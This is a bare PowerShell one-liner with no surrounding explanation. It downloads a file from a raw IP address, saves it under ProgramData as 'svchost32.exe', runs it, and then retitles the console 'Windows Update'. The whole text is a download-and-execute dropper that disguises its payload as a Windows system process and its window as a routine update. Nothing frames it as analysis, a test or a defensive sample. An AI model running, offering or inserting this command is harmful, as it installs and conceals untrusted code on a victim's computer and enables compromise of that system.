
$DownloadUrl = "http://203.0.113.4/assets/update.dat"; $DropPath = 'C:\ProgramData\svchost32.exe'; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DropPath -UseBasicParsing; Start-Process -FilePath $DropPath; Start-Sleep -Seconds 40; $Host.UI.RawUI.WindowTitle = "Windows Update"
